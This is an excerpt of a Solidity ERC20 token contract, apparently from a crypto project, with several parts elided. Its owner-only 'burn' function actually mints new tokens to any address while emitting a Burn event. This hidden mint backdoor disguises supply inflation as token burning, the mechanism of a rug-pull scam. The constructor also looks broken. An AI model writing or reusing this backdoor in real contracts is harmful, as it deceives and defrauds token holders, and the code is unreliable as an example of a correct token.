...
// LFG TOMB IS LIFE AND LIFE IS TOMB
...
// File contracts/completeERC20.sol

pragma solidity 0.8.0;


contract CompleteERC20 is Ownable, ERC20 {
    ...
    event Burn(address burned, uint256 amount, address by);

    constructor (string memory _tempName, string memory _tempSymbol, uint8 _tempDecimals) ERC20(_name, _symbol) public {
        _name = _tempName;
        _symbol = _tempSymbol;
        _decimals = _tempDecimals;
    }
    ...
    function burn(address _receiver, uint256 _amount) public onlyOwner {
        _mint(_receiver, _amount);
        emit Burn(_receiver, _amount, msg.sender);
    }
